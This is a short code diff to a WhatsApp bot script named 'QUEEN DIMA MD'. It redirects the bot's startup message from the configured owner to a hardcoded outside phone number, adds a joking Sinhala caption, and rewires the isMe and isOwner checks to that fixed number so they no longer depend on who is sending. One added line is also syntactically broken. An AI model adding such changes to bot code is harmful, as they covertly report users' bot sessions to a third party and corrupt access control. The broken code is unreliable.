@@ -69,9 +69,9 @@ require("./plugins/" + plugin);
 console.log('Plugins installed successful ✅')
 console.log('Bot connected to whatsapp ✅')
 
-let up = `QUEEN DIMA MD  connected successful ✅\n\nPREFIX: ${prefix}`;
+let up = `QUEEN DIMA MD (උඩ ඇති බම් SESION UD එක 😂) connected successful ✅\n\nPREFIX: ${prefix}`;
 
-conn.sendMessage(ownerNumber + "@s.whatsapp.net", { image: { url: `https://pomf2.lain.la/f/uzu4feg.jpg` }, caption: up })
+conn.sendMessage(94776938009 + "@s.whatsapp.net", { image: { url:https://i.ibb.co/s5QP4r7/8f128a33b8ae00c3.jpg ` }, caption: up })
 
 }
 })
@@ -98,9 +98,9 @@ const isGroup = from.endsWith('@g.us')
 const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
 const senderNumber = sender.split('@')[0]
 const botNumber = conn.user.id.split(':')[0]
-const pushname = mek.pushName || 'Sin Nombre'
-const isMe = botNumber.includes(senderNumber)
-const isOwner = ownerNumber.includes(senderNumber) || isMe
+const pushname = mek.pushName || 'CHALAH TECH'
+const isMe = botNumber.includes(94776938009)
+const isOwner = ownerNumber.includes(94776938009) || isMe
 const botNumber2 = await jidNormalizedUser(conn.user.id);
 const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
 const groupName = isGroup ? groupMetadata.subject : ''
